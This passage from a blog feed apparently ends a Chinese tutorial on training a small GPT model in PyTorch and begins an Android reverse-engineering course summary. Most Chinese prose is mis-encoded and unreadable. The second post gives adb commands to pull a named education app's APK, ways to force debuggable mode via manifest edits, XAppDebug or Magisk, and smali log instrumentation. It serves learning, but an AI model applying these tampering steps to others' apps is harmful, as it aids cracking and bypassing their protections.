target_ids.to(device)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># å‰å‘ä¼ æ’­</span></span><br><span class="line">            outputs = model(input_ids, labels=target_ids)</span><br><span class="line">            loss = outputs.loss</span><br><span class="line">            total_loss += loss.item()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># åå‘ä¼ æ’­</span></span><br><span class="line">            loss.backward()</span><br><span class="line">            <span class="comment"># è®­ç»ƒè¿‡ç¨‹ä¸­æ·»åŠ æ¢¯åº¦è£å‰ª</span></span><br><span class="line">            torch.nn.utils.clip_grad_norm_(model.parameters(), max_norm=<span class="number">1.0</span>)</span><br><span class="line">            optimizer.step()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è¾“å‡ºæ¯ä¸ª epoch çš„æŸå¤±</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Epoch <span class="subst">&#123;epoch+<span class="number">1</span>&#125;</span>, Loss: <span class="subst">&#123;total_loss / <span class="built_in">len</span>(data_loader)&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># å­¦ä¹ ç‡è°ƒåº¦</span></span><br><span class="line">        scheduler.step()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä¿å­˜è®­ç»ƒå¥½çš„æ¨¡å‹</span></span><br><span class="line">    torch.save(model.state_dict(), <span class="string">&quot;trained_model/model.pth&quot;</span>)</span><br><span class="line"></span><br><span class="line">    tokenizer.save_pretrained(<span class="string">&quot;trained_model&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    train()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="6-inference-py"><a href="#6-inference-py" class="headerlink" title="6. inference.py"></a>6. <strong>inference.py</strong></h2><p>è¿™æ˜¯æ¨ç†è„šæœ¬ï¼Œç”¨äºåŠ è½½è®­ç»ƒå¥½çš„æ¨¡å‹å¹¶è¿›è¡Œæ¨ç†ï¼ˆç”Ÿæˆé¢„æµ‹ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># inference.py</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"></span><br><span class="line">project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), <span class="string">&#x27;..&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Adding to sys.path:&quot;</span>, project_root)</span><br><span class="line">sys.path.append(project_root)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> model.gpt <span class="keyword">import</span> GPT</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_model</span>():</span><br><span class="line">    <span class="comment"># åŠ è½½æ¨¡å‹</span></span><br><span class="line">    model = GPT(vocab_size=<span class="number">50000</span>, embed_size=<span class="number">256</span>, num_layers=<span class="number">6</span>, num_heads=<span class="number">8</span>, max_length=<span class="number">512</span>)</span><br><span class="line">    model.load_state_dict(torch.load(<span class="string">&quot;trained_model/model.pth&quot;</span>), strict=<span class="literal">False</span>)</span><br><span class="line">    model.<span class="built_in">eval</span>()  <span class="comment"># è®¾ç½®ä¸ºè¯„ä¼°æ¨¡å¼</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># åŠ è½½åˆ†è¯å™¨</span></span><br><span class="line">    tokenizer = AutoTokenizer.from_pretrained(<span class="string">&#x27;gpt2&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> model, tokenizer  <span class="comment"># è¿”å›æ¨¡å‹å’Œåˆ†è¯å™¨</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chat</span>():</span><br><span class="line">    model, tokenizer = load_model()  <span class="comment"># åŠ è½½æ¨¡å‹å’Œåˆ†è¯å™¨</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        text = <span class="built_in">input</span>(<span class="string">&quot;Input: &quot;</span>)  <span class="comment"># è·å–ç”¨æˆ·è¾“å…¥</span></span><br><span class="line">        <span class="keyword">if</span> text.lower() == <span class="string">&quot;quit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¯¹è¾“å…¥æ–‡æœ¬è¿›è¡Œç¼–ç </span></span><br><span class="line">        input_ids = tokenizer.encode(text, return_tensors=<span class="string">&#x27;pt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ç”Ÿæˆæ–‡æœ¬</span></span><br><span class="line">        generated_ids = model.generate(input_ids, max_length=<span class="number">100</span>, temperature=<span class="number">1.0</span>, top_k=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è§£ç å¹¶æ‰“å°ç”Ÿæˆçš„æ–‡æœ¬</span></span><br><span class="line">        output_text = tokenizer.decode(generated_ids[<span class="number">0</span>], skip_special_tokens=<span class="literal">True</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;GPT: <span class="subst">&#123;output_text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    chat()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åè¿è¡Œé¡ºåºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python312 train/train.py</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501292344755.png" alt="1738165457988.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python312 inference.py</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501292343248.png" alt="1738165422521.png"></p><script src="https://giscus.app/client.js"        data-repo="Samsara-lo/Samsara-lo.github.io"        data-repo-id="R_kgDONimTFg"        data-category="General"        data-category-id="DIC_kwDONimTFs4CorbM"        data-mapping="pathname"        data-strict="0"        data-reactions-enabled="1"        data-emit-metadata="0"        data-input-position="bottom"        data-theme="light_high_contrast"        data-lang="zh-CN"        crossorigin="anonymous"        async></script>]]></content>
      
      
      <categories>
          
          <category> å®æˆ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android-è¯¾ç¨‹æ€»ç»“</title>
      <link href="/2025/01/19/Android-%E8%AF%BE%E7%A8%8B%E6%80%BB%E7%BB%93/"/>
      <url>/2025/01/19/Android-%E8%AF%BE%E7%A8%8B%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>å‚è€ƒ</p><p>æ­£å·±è€å¸ˆçš„ã€Šå®‰å“é€†å‘è¿™æ¡£äº‹ã€‹</p><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><h3 id="ä¸æ‰‹æœºå»ºç«‹è¿æ¥"><a href="#ä¸æ‰‹æœºå»ºç«‹è¿æ¥" class="headerlink" title="ä¸æ‰‹æœºå»ºç«‹è¿æ¥"></a>ä¸æ‰‹æœºå»ºç«‹è¿æ¥</h3><h4 id="æ¨¡æ‹Ÿå™¨"><a href="#æ¨¡æ‹Ÿå™¨" class="headerlink" title="æ¨¡æ‹Ÿå™¨"></a>æ¨¡æ‹Ÿå™¨</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb connect 127.0.0.1:ç«¯å£å·</span><br><span class="line">adb devices</span><br><span class="line">adb -s 127.0.0.1:ç«¯å£å· shell</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šæˆ‘çš„æ˜¯mumuæ¨¡æ‹Ÿå™¨ï¼Œæ¯æ¬¡éƒ½è¦åˆ°å¤šå¼€å™¨é‡Œé¢æŸ¥çœ‹adbç«¯å£å»ºç«‹è¿æ¥ï¼Œä½†æ˜¯æ­£å¸¸åº”è¯¥å¯ä»¥ç›´æ¥adb devices&amp;adb shellã€‚æ¨¡æ‹Ÿå™¨æ˜¯è¿™æ ·çš„TT</p><h4 id="çœŸæœº"><a href="#çœŸæœº" class="headerlink" title="çœŸæœº"></a>çœŸæœº</h4><p>æ‰‹æœºå¼€å¼€å‘è€…ç‰ˆæœ¬å’ŒUSBè°ƒè¯•ï¼Œç„¶åé€šè¿‡æ•°æ®çº¿è¿æ¥</p><ul><li>æœ‰ä¸€äº›æ•°æ®çº¿åªèƒ½å……ç”µï¼Œç¬¬ä¸€æ¬¡è¿æ¥ç”µè„‘çš„æ—¶å€™æ‰‹æœºä¸Šä¼šå¼¹å‡ºè¦æ±‚å…è®¸ USB è°ƒè¯•è®¿é—®ã€‚ç¡®ä¿ä½ ç‚¹å‡»äº†â€œå…è®¸â€æŒ‰é’®ã€‚</li><li>å¦‚æœæ²¡å¼¹å‡ºå°±æ¢ä¸€æ ¹æ•°æ®çº¿/é‡å¯ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb devices</span><br><span class="line">adb shell</span><br></pre></td></tr></table></figure><h3 id="æ–‡ä»¶ä¼ è¾“"><a href="#æ–‡ä»¶ä¼ è¾“" class="headerlink" title="æ–‡ä»¶ä¼ è¾“"></a>æ–‡ä»¶ä¼ è¾“</h3><h4 id="ä¼ æ–‡ä»¶è¿›windows"><a href="#ä¼ æ–‡ä»¶è¿›windows" class="headerlink" title="ä¼ æ–‡ä»¶è¿›windows"></a>ä¼ æ–‡ä»¶è¿›windows</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb -s 127.0.0.1:16384 shell pm list packages</span><br><span class="line">adb -s 127.0.0.1:16384 shell pm path com.chaoxing.mobile</span><br><span class="line">adb -s 127.0.0.1:16384 pull /data/app/~~EerlSikM2HRGxvcqMsmfIg==/com.chaoxing.mobile-_E7VgeY662xxYG0tGxtKrQ==/base.apk D:\æ¡Œé¢\xuexitong</span><br></pre></td></tr></table></figure><h4 id="æ¨é€æ–‡ä»¶è‡³æ¨¡æ‹Ÿå™¨"><a href="#æ¨é€æ–‡ä»¶è‡³æ¨¡æ‹Ÿå™¨" class="headerlink" title="æ¨é€æ–‡ä»¶è‡³æ¨¡æ‹Ÿå™¨"></a>æ¨é€æ–‡ä»¶è‡³æ¨¡æ‹Ÿå™¨</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb push &quot;D:\LeStoreDownload\ç½‘é¡µ\frida-clr-16.5.7-windows-x86_64.dll\frida-clr-16.5.7-windows-x86_64.dll&quot; /data/local/tmp/</span><br><span class="line">adb shell ls /data/local/tmp/</span><br></pre></td></tr></table></figure><h4 id="è½¯ä»¶å®‰è£…"><a href="#è½¯ä»¶å®‰è£…" class="headerlink" title="è½¯ä»¶å®‰è£…"></a>è½¯ä»¶å®‰è£…</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install  a.apk</span><br></pre></td></tr></table></figure><h3 id="åˆè¯†APK"><a href="#åˆè¯†APK" class="headerlink" title="åˆè¯†APK"></a>åˆè¯†APK</h3><p><strong>APK</strong>ï¼šå…¨ç§°Android Packageï¼Œç›¸å½“äºå‹ç¼©æ–‡ä»¶ï¼ŒæŠŠ.apkåç¼€æ”¹ä¸º.zipå°±å¯ä»¥è§£å‹</p><ul><li><strong>assetsç›®å½• </strong>ï¼šå­˜æ”¾apké™æ€èµ„æºï¼Œè§†é¢‘å›¾ç‰‡ç­‰ã€‚</li><li><strong>libç›®å½•</strong>ï¼šarmeabi-v7aåŸºæœ¬é€šç”¨æ‰€æœ‰androidè®¾å¤‡ï¼Œarm64-v8aåªé€‚ç”¨äº64ä½çš„androidè®¾å¤‡ï¼Œx86å¸¸è§ç”¨äºandroidæ¨¡æ‹Ÿå™¨ï¼Œå…¶ç›®å½•ä¸‹çš„.soæ–‡ä»¶æ˜¯cæˆ–c++ç¼–è¯‘çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ã€‚</li><li><strong>META-INFç›®å½•</strong>ï¼šå­˜æ”¾ç­¾åä¿¡æ¯ï¼Œç”¨æ¥éªŒè¯APKçš„å®Œæ•´æ€§ã€‚</li><li><strong>resæ–‡ä»¶</strong>ï¼šèµ„æºæ–‡ä»¶ï¼Œå›¾ç‰‡å­—ç¬¦ä¸²ç­‰ï¼ˆä¼šè½¬ä¸ºäºŒè¿›åˆ¶æ ¼å¼ï¼‰</li><li><strong>AndroidMainfest.xmlæ–‡ä»¶</strong>ï¼šAPKçš„åº”ç”¨æ¸…å•ï¼Œæè¿°åº”ç”¨åå­—ç‰ˆæœ¬ç­‰</li><li><strong>classes.dexæ–‡ä»¶</strong>ï¼šclasses.dexæ˜¯Javaæºç ç¼–ç åçš„javaå­—èŠ‚ç ï¼Œ<strong>APKè¿è¡Œçš„ä¸»è¦é€»è¾‘</strong></li><li><strong>resources.arsc</strong>ï¼šresources.arscæ˜¯ç¼–è¯‘åçš„äºŒè¿›åˆ¶èµ„æºæ–‡ä»¶ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ˜ å°„è¡¨ï¼Œæ˜ å°„ç€èµ„æºå’Œidï¼Œé€šè¿‡Ræ–‡ä»¶ä¸­çš„idå°±å¯ä»¥æ‰¾åˆ°å¯¹åº”çš„èµ„æº</li></ul><p><strong>assetså’Œresæœ‰ä»€ä¹ˆä¸åŒï¼Ÿ</strong></p><p>assetsä¸»è¦å­˜æ”¾çš„æ˜¯åº”ç”¨å†…æ˜¾ç¤ºå‡ºæ¥çš„å›¾ç‰‡ï¼Œä¸ä¼šè½¬ä¸ºäºŒè¿›åˆ¶æ ¼å¼</p><p>resæ˜¯uiè®¾è®¡ç›¸å…³çš„æ–‡ä»¶ï¼Œä¼šè½¬ä¸ºäºŒè¿›åˆ¶æ ¼å¼ï¼Œç»è¿‡å‹ç¼©ä¼˜åŒ–</p><h3 id="JVMã€Dalvikã€ART"><a href="#JVMã€Dalvikã€ART" class="headerlink" title="JVMã€Dalvikã€ART"></a>JVMã€Dalvikã€ART</h3><p>JVMæ˜¯JAVAè™šæ‹Ÿæœºï¼Œè¿è¡ŒJAVAå­—èŠ‚ç ç¨‹åº<br>Dalvikæ˜¯Googleä¸“é—¨ä¸ºAndroidè®¾è®¡çš„ä¸€ä¸ªè™šæ‹Ÿæœºï¼ŒDalvikæœ‰ä¸“å±çš„æ–‡ä»¶æ‰§è¡Œæ ¼å¼dex(Dalvik executable)<br>Art(Android Runtime)ç›¸å½“äºDalvikçš„å‡çº§ç‰ˆï¼Œæœ¬è´¨ä¸Dalvikæ— å¼‚</p><h3 id="å®‰å“å››å¤§ç»„ä»¶"><a href="#å®‰å“å››å¤§ç»„ä»¶" class="headerlink" title="å®‰å“å››å¤§ç»„ä»¶"></a>å®‰å“å››å¤§ç»„ä»¶</h3><div class="table-container"><table><thead><tr><th style="text-align:left">ç»„ä»¶</th><th style="text-align:left">æè¿°</th></tr></thead><tbody><tr><td style="text-align:left">Activity(æ´»åŠ¨)</td><td style="text-align:left">åœ¨åº”ç”¨ä¸­çš„ä¸€ä¸ªActivityå¯ä»¥ç”¨æ¥è¡¨ç¤ºä¸€ä¸ªç•Œé¢ï¼Œæ„æ€å¯ä»¥ç†è§£ä¸ºâ€œæ´»åŠ¨â€ï¼Œå³ä¸€ä¸ªæ´»åŠ¨å¼€å§‹ï¼Œä»£è¡¨ Activityç»„ä»¶å¯åŠ¨ï¼Œæ´»åŠ¨ç»“æŸï¼Œä»£è¡¨ä¸€ä¸ªActivityçš„ç”Ÿå‘½å‘¨æœŸç»“æŸã€‚ä¸€ä¸ªAndroidåº”ç”¨å¿…é¡»é€šè¿‡Activityæ¥è¿è¡Œå’Œå¯åŠ¨ï¼ŒActivityçš„ç”Ÿå‘½å‘¨æœŸäº¤ç»™ç³»ç»Ÿç»Ÿä¸€ç®¡ç†ã€‚</td></tr><tr><td style="text-align:left">Service(æœåŠ¡)</td><td style="text-align:left">Serviceå®ƒå¯ä»¥åœ¨åå°æ‰§è¡Œé•¿æ—¶é—´è¿è¡Œæ“ä½œè€Œæ²¡æœ‰ç”¨æˆ·ç•Œé¢çš„åº”ç”¨ç»„ä»¶ï¼Œä¸ä¾èµ–ä»»ä½•ç”¨æˆ·ç•Œé¢ï¼Œä¾‹å¦‚åå°æ’­æ”¾éŸ³ä¹ï¼Œåå°ä¸‹è½½æ–‡ä»¶ç­‰ã€‚</td></tr><tr><td style="text-align:left">Broadcast Receiver(å¹¿æ’­æ¥æ”¶å™¨)</td><td style="text-align:left">ä¸€ä¸ªç”¨äºæ¥æ”¶å¹¿æ’­ä¿¡æ¯ï¼Œå¹¶åšå‡ºå¯¹åº”å¤„ç†çš„ç»„ä»¶ã€‚æ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„ç³»ç»Ÿå¹¿æ’­ï¼šé€šçŸ¥æ—¶åŒºæ”¹å˜ã€ç”µé‡ä½ã€ç”¨æˆ·æ”¹å˜äº†è¯­è¨€é€‰é¡¹ç­‰ã€‚</td></tr><tr><td style="text-align:left">Content Provider(å†…å®¹æä¾›è€…)</td><td style="text-align:left">ä½œä¸ºåº”ç”¨ç¨‹åºä¹‹é—´å”¯ä¸€çš„å…±äº«æ•°æ®çš„é€”å¾„ï¼ŒContent Providerä¸»è¦çš„åŠŸèƒ½å°±æ˜¯å­˜å‚¨å¹¶æ£€ç´¢æ•°æ®ä»¥åŠå‘å…¶ä»–åº”ç”¨ç¨‹åºæä¾›è®¿é—®æ•°æ®çš„æ¥å£ã€‚Androidå†…ç½®çš„è®¸å¤šæ•°æ®éƒ½æ˜¯ä½¿ç”¨Content Providerå½¢å¼ï¼Œä¾›å¼€å‘è€…è°ƒç”¨çš„ï¼ˆå¦‚è§†é¢‘ï¼ŒéŸ³é¢‘ï¼Œå›¾ç‰‡ï¼Œé€šè®¯å½•ç­‰ï¼‰</td></tr></tbody></table></div><h3 id="Activityç”Ÿå‘½å‘¨æœŸ"><a href="#Activityç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="Activityç”Ÿå‘½å‘¨æœŸ"></a>Activityç”Ÿå‘½å‘¨æœŸ</h3><div class="table-container"><table><thead><tr><th style="text-align:left">å‡½æ•°åç§°</th><th style="text-align:left">æè¿°</th></tr></thead><tbody><tr><td style="text-align:left">onCreate()</td><td style="text-align:left">ä¸€ä¸ªActivityå¯åŠ¨åç¬¬ä¸€ä¸ªè¢«è°ƒç”¨çš„å‡½æ•°ï¼Œå¸¸ç”¨æ¥åœ¨æ­¤æ–¹æ³•ä¸­è¿›è¡ŒActivityçš„ä¸€äº›åˆå§‹åŒ–æ“ä½œã€‚ä¾‹å¦‚åˆ›å»ºViewï¼Œç»‘å®šæ•°æ®ï¼Œæ³¨å†Œç›‘å¬ï¼ŒåŠ è½½å‚æ•°ç­‰ã€‚</td></tr><tr><td style="text-align:left">onStart()</td><td style="text-align:left">å½“Activityæ˜¾ç¤ºåœ¨å±å¹•ä¸Šæ—¶ï¼Œæ­¤æ–¹æ³•è¢«è°ƒç”¨ä½†æ­¤æ—¶è¿˜æ— æ³•è¿›è¡Œä¸ç”¨æˆ·çš„äº¤äº’æ“ä½œã€‚</td></tr><tr><td style="text-align:left">onResume()</td><td style="text-align:left">è¿™ä¸ªæ–¹æ³•åœ¨onStart()ä¹‹åè°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯åœ¨Activityå‡†å¤‡å¥½ä¸ç”¨æˆ·è¿›è¡Œäº¤äº’çš„æ—¶å€™è°ƒç”¨ï¼Œæ­¤æ—¶çš„Activityä¸€å®šä½äºActivityæ ˆé¡¶ï¼Œå¤„äºè¿è¡ŒçŠ¶æ€ã€‚</td></tr><tr><td style="text-align:left">onPause()</td><td style="text-align:left">è¿™ä¸ªæ–¹æ³•æ˜¯åœ¨ç³»ç»Ÿå‡†å¤‡å»å¯åŠ¨æˆ–è€…æ¢å¤å¦å¤–ä¸€ä¸ªActivityçš„æ—¶å€™è°ƒç”¨ï¼Œé€šå¸¸åœ¨è¿™ä¸ªæ–¹æ³•ä¸­æ‰§è¡Œä¸€äº›é‡Šæ”¾èµ„æºçš„æ–¹æ³•ï¼Œä»¥åŠä¿å­˜ä¸€äº›å…³é”®æ•°æ®ã€‚</td></tr><tr><td style="text-align:left">onStop()</td><td style="text-align:left">è¿™ä¸ªæ–¹æ³•æ˜¯åœ¨Activityå®Œå…¨ä¸å¯è§çš„æ—¶å€™è°ƒç”¨çš„ã€‚</td></tr><tr><td style="text-align:left">onDestroy()</td><td style="text-align:left">è¿™ä¸ªæ–¹æ³•åœ¨Activityé”€æ¯ä¹‹å‰è°ƒç”¨ï¼Œä¹‹åActivityçš„çŠ¶æ€ä¸ºé”€æ¯çŠ¶æ€ã€‚</td></tr><tr><td style="text-align:left">onRestart()</td><td style="text-align:left">å½“Activityä»åœæ­¢stopçŠ¶æ€æ¢è¿›å…¥startçŠ¶æ€æ—¶è°ƒç”¨çŠ¶æ€ã€‚</td></tr></tbody></table></div><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501190150532.png" alt="1737222612157.png"></p><h3 id="åŠ¨æ€è°ƒè¯•"><a href="#åŠ¨æ€è°ƒè¯•" class="headerlink" title="åŠ¨æ€è°ƒè¯•"></a>åŠ¨æ€è°ƒè¯•</h3><h4 id="1-ä¿®æ”¹debugæƒé™"><a href="#1-ä¿®æ”¹debugæƒé™" class="headerlink" title="1.ä¿®æ”¹debugæƒé™"></a>1.ä¿®æ”¹debugæƒé™</h4><p><strong>æ–¹æ³•ä¸€</strong>:åœ¨AndroidManifest.xmlé‡Œæ·»åŠ å¯è°ƒè¯•æƒé™ï¼ˆåœ¨applicationé‡Œï¼‰</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:debuggable=&quot;true&quot;</span><br></pre></td></tr></table></figure><p><strong>æ–¹æ³•äºŒ</strong>ï¼šXappDebugæ¨¡å—hookå¯¹åº”çš„app</p><p><a href="https://github.com/Palatis/XAppDebug">XappDebug</a></p><p><strong>æ–¹æ³•ä¸‰</strong>ï¼šMagiskå‘½ä»¤(é‡å¯å¤±æ•ˆ)</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span>  adb shell #adbè¿›å…¥å‘½ä»¤è¡Œæ¨¡å¼</span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span>  su #åˆ‡æ¢è‡³è¶…çº§ç”¨æˆ·</span><br><span class="line"></span><br><span class="line"><span class="bullet">3.</span>  magisk resetprop ro.debuggable 1</span><br><span class="line"></span><br><span class="line"><span class="bullet">4.</span>  stop;start; #ä¸€å®šè¦é€šè¿‡è¯¥æ–¹å¼é‡å¯</span><br></pre></td></tr></table></figure><p><strong>æ–¹æ³•å››</strong>:åˆ·å…¥MagiskHide Props Configæ¨¡å—</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨4é€‰é¡¹ä¸­å¦‚æœæœ‰ro.debuggableé‚£å°±ç›´æ¥ä¿®æ”¹<br>æ²¡æœ‰çš„è¯å°±é€‰5<br><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501211617314.png" alt="1737447405593.png"></p><p>ä¿®æ”¹ro.debuggableçš„å€¼ä¸º1</p><h4 id="2-ç«¯å£è½¬å‘ä»¥åŠå¼€å¯adbæƒé™"><a href="#2-ç«¯å£è½¬å‘ä»¥åŠå¼€å¯adbæƒé™" class="headerlink" title="2.ç«¯å£è½¬å‘ä»¥åŠå¼€å¯adbæƒé™"></a>2.ç«¯å£è½¬å‘ä»¥åŠå¼€å¯adbæƒé™</h4><p>ç‰ˆæœ¬å·ç‚¹å‡»ä¸ƒæ¬¡å¼€å¯å¼€å‘è€…æ¨¡å¼å¹¶å¼€å¯adbè°ƒè¯•æƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:9999 tcp:9999</span><br></pre></td></tr></table></figure><h4 id="3-ä¸‹æ®µç‚¹"><a href="#3-ä¸‹æ®µç‚¹" class="headerlink" title="3.ä¸‹æ®µç‚¹"></a>3.ä¸‹æ®µç‚¹</h4><p>ctrl+bä¸‹æ–­ç‚¹</p><h4 id="4-debugæ¨¡å¼å¯åŠ¨"><a href="#4-debugæ¨¡å¼å¯åŠ¨" class="headerlink" title="4.debugæ¨¡å¼å¯åŠ¨"></a>4.debugæ¨¡å¼å¯åŠ¨</h4><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -D -n <span class="keyword">com</span>.zj.wuaipojie/.ui.MainActivity</span><br></pre></td></tr></table></figure><p>adb shell am start -D -n<br>adb shell am start -D -n åŒ…å/ç±»å<br>am start -n è¡¨ç¤ºå¯åŠ¨ä¸€ä¸ªactivity<br>am start -D è¡¨ç¤ºå°†åº”ç”¨è®¾ç½®ä¸ºå¯è°ƒè¯•æ¨¡å¼</p><h4 id="5-Jebé™„åŠ è°ƒè¯•è¿›ç¨‹"><a href="#5-Jebé™„åŠ è°ƒè¯•è¿›ç¨‹" class="headerlink" title="5.Jebé™„åŠ è°ƒè¯•è¿›ç¨‹"></a>5.Jebé™„åŠ è°ƒè¯•è¿›ç¨‹</h4><h3 id="Logæ’æ¡©"><a href="#Logæ’æ¡©" class="headerlink" title="Logæ’æ¡©"></a>Logæ’æ¡©</h3><p>å®šä¹‰ï¼šLogæ’æ¡©æŒ‡çš„æ˜¯åç¼–è¯‘APKæ–‡ä»¶æ—¶ï¼Œåœ¨å¯¹åº”çš„smaliæ–‡ä»¶é‡Œï¼Œæ·»åŠ ç›¸åº”çš„smaliä»£ç ï¼Œå°†ç¨‹åºä¸­çš„å…³é”®ä¿¡æ¯ï¼Œä»¥logæ—¥å¿—çš„å½¢å¼è¿›è¡Œè¾“å‡ºã€‚</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;å¯¹åº”å¯„å­˜å™¨&#125;, <span class="class">Lcom/mtools/LogUtils;</span>-&gt;v(<span class="class">Ljava/lang/Object;</span>)V</span><br></pre></td></tr></table></figure><h2 id="smaliåŠå…¶è¯­æ³•"><a href="#smaliåŠå…¶è¯­æ³•" class="headerlink" title="smaliåŠå…¶è¯­æ³•"></a>smaliåŠå…¶è¯­æ³•</h2><p>smaliæ˜¯Dalvikçš„å¯„å­˜å™¨è¯­è¨€ï¼Œsmaliä»£ç æ˜¯dexåç¼–è¯‘è€Œæ¥çš„ã€‚</p><h3 id="å…³é”®å­—"><a href="#å…³é”®å­—" class="headerlink" title="å…³é”®å­—"></a>å…³é”®å­—</h3><div class="table-container"><table><thead><tr><th style="text-align:left">åç§°</th><th style="text-align:left">æ³¨é‡Š</th></tr></thead><tbody><tr><td style="text-align:left">.class</td><td style="text-align:left">ç±»å</td></tr><tr><td style="text-align:left">.super</td><td style="text-align:left">çˆ¶ç±»åï¼Œç»§æ‰¿çš„ä¸Šçº§ç±»ååç§°</td></tr><tr><td style="text-align:left">.source</td><td style="text-align:left">æºå</td></tr><tr><td style="text-align:left">.field</td><td style="text-align:left">å˜é‡</td></tr><tr><td style="text-align:left">.method</td><td style="text-align:left">æ–¹æ³•å</td></tr><tr><td style="text-align:left">.register</td><td style="text-align:left">å¯„å­˜å™¨</td></tr><tr><td style="text-align:left">.end method</td><td style="text-align:left">æ–¹æ³•åçš„ç»“æŸ</td></tr><tr><td style="text-align:left">public</td><td 